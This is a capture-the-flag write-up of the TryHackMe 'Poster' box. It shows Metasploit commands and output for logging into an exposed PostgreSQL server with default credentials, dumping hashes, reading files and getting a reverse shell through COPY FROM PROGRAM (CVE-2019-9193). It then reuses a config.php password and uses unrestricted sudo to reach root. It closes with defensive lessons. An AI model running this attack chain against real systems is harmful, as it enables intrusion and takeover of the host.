Poster is an Easy Linux box from TryHackMe that is, start to finish, a lesson in one misconfiguration: a **PostgreSQL** server exposed to the network with default credentials. From `postgres:password` the whole box unravels — we dump the database password hashes, read arbitrary files off disk, and finally turn PostgreSQL's `COPY ... FROM PROGRAM` feature (**CVE-2019-9193**) into a reverse shell as the `postgres` user. From there a web app's `config.php` hands over a password that is reused for the `alison` account, and `alison` holds unrestricted `sudo` — so root is a single command away.

## Reconnaissance & Enumeration

### Port Scan

A full TCP scan with service and default-script detection. `-p-` covers all 65,535 ports, `-sCV` runs the default NSE scripts plus version detection, and `-Pn` skips host discovery since the box answered a ping.

```bash
sudo nmap -p- -sCV -Pn -n 10.129.172.182 -oN nmap
```

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
```

Three services, but one stands out immediately: **PostgreSQL on 5432 is exposed to the network**. A database should almost never be reachable directly from outside the host, and when it is, weak or default credentials are the first thing to try. The web app ("Poster CMS") and SSH are noted, but PostgreSQL is the obvious lead.

## Initial Access — CVE-2019-9193 (PostgreSQL `COPY FROM PROGRAM` RCE) as `postgres`

Everything in this section runs through Metasploit's PostgreSQL modules, so we work from `msfconsole` and set the target once, globally, so every module inherits it.

### Default credentials

```bash
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(scanner/postgres/postgres_login) > setg RHOSTS 10.129.172.182
msf auxiliary(scanner/postgres/postgres_login) > run
```

- **`use auxiliary/scanner/postgres/postgres_login`** loads the PostgreSQL credential scanner, which tries a built-in list of common username/password pairs.
- **`setg RHOSTS 10.129.172.182`** sets the target **globally** (`setg` rather than `set`), so the other postgres modules we load afterwards don't need it re-typed.
- **`run`** launches the attack. It finds the default superuser login straight away:

```bash
[+] 10.129.172.182:5432 - Login Successful: postgres:password@template1
```

**`postgres:password`** — the default PostgreSQL superuser account, never changed. With a superuser login, the rest of the database modules are open to us.

### Confirming access and dumping hashes

A quick sanity check that we can run SQL, then a dump of the stored password hashes:

```bash
msf > use auxiliary/admin/postgres/postgres_sql
msf auxiliary(admin/postgres/postgres_sql) > run
# Query Text: 'select version()'
# PostgreSQL 9.5.21 on x86_64-pc-linux-gnu ...
```

- **`auxiliary/admin/postgres/postgres_sql`** runs an arbitrary SQL statement (by default `select version()`) to confirm the credentials actually give query access.

```bash
msf > use auxiliary/scanner/postgres/postgres_hashdump
msf auxiliary(scanner/postgres/postgres_hashdump) > run
```

- **`auxiliary/scanner/postgres/postgres_hashdump`** reads the `pg_shadow`/`pg_authid` table and prints every role's MD5 password hash:

```bash
Username   Hash
```

These PostgreSQL MD5 hashes could be cracked offline, but we don't need them — superuser access gives us far more direct routes.

### Reading files off disk

As a superuser, PostgreSQL can read local files into a table. The `postgres_readfile` module wraps this into a `COPY` from `/etc/passwd`:

```bash
msf > use auxiliary/admin/postgres/postgres_readfile
msf auxiliary(admin/postgres/postgres_readfile) > run
```

- **`auxiliary/admin/postgres/postgres_readfile`** creates a temporary table and runs `COPY <table> FROM '/etc/passwd'`, then selects it back — letting us read any file the `postgres` process can access.

```bash
#/home/dark/credentials.txt
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
dark:x:1001:1001::/home/dark:
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

Two interactive users stand out — **`alison`** and **`dark`** — plus a suggestive comment at the very top pointing at `/home/dark/credentials.txt`. Reading files is useful, but what we really want is code execution.

### `COPY FROM PROGRAM` → reverse shell

PostgreSQL 9.3+ lets a superuser run `COPY ... FROM PROGRAM '<cmd>'`, which executes a shell command as the database service account. This is **CVE-2019-9193**, and Metasploit automates it. Because the automatic reverse-TCP handler failed to bind here (the port was already in use locally), we catch the shell with our own `netcat` listener instead and point the payload at it:

```bash
# listener in a separate terminal
nc -nvlp 4444
```

```bash
msf > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
```

```bash
[+] 10.129.172.182:5432 - EWtld6VF6Y created successfully
[+] 10.129.172.182:5432 - EWtld6VF6Y copied successfully(valid syntax/command)
[*] Exploit Succeeded
```

- **`exploit/multi/postgres/postgres_copy_from_program_cmd_exec`** performs the `COPY FROM PROGRAM` trick: it creates a temporary table, runs our command through it, and cleans up afterwards. The command is a reverse shell back to our listener.

The listener catches it:

```bash
Connection received on 10.129.172.182 38864
whoami
postgres
```

A shell as **`postgres`**. After the usual TTY upgrade (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, then `stty raw -echo`), we can enumerate properly.

## Lateral Movement — `postgres` → `alison`

The Poster CMS web application stores its database credentials in cleartext, as PHP apps do. Reading its config file hands over a working password:

```bash
postgres@ubuntu:/$ cat /var/www/html/config.php
```

```php
<?php
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>
```

Two things make this the pivot. The username is **`alison`** — a real interactive user we saw in `/etc/passwd` — and the database name is a very unsubtle hint: **`mysudopassword`**. The password `p4ssw0rdS3cur3!#` was reused as alison's system login, so it works with `su`:

```bash
postgres@ubuntu:/$ su alison
Password: p4ssw0rdS3cur3!#
alison@ubuntu:~$ cat user.txt
REDACTED
```

## Privilege Escalation — `alison` → `root` (sudo)

The `mysudopassword` hint pays off immediately. Checking alison's sudo rights:

```bash
alison@ubuntu:~$ sudo -l
```

```bash
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

**`(ALL : ALL) ALL`** means alison can run *any* command as *any* user, including root, with no restrictions. That is the highest level of sudo access there is, so becoming root is a single command:

```bash
alison@ubuntu:~$ sudo su
root@ubuntu:/home/alison# whoami
root
root@ubuntu:~# cat root.txt
REDACTED
```

## Key Takeaways

- **Never expose a database to the network.** PostgreSQL on 5432, reachable from outside the host, was the entire foothold. A database should bind to localhost (or a locked-down internal interface) and sit behind the application, never be directly dialable by an attacker.
- **Default credentials are a full compromise, not a warning.** `postgres:password` wasn't just an info leak — as a superuser it unlocked file reads, hash dumps and, through `COPY FROM PROGRAM`, remote code execution. Change every default credential, and treat database superuser access as equivalent to shell access on the host.
- **`COPY FROM PROGRAM` is RCE by design.** CVE-2019-9193 is really the observation that a PostgreSQL superuser can run OS commands as the service account — a legitimate feature with dangerous reach. If the DB account is over-privileged and exposed, that feature becomes a reverse shell.
- **Cleartext credentials in config files chain accounts together.** The web app's `config.php` stored alison's password in plaintext, and that single reused password bridged `postgres` → `alison`. Application secrets deserve the same protection as any other credential, and reusing a database password for a shell login collapses two separate trust boundaries into one.
- **Unrestricted `sudo` is game over.** Once on `alison`, `(ALL : ALL) ALL` made root trivial. Sudo rules should grant the minimum specific commands a user needs — a blanket `ALL` is indistinguishable from handing out the root password.
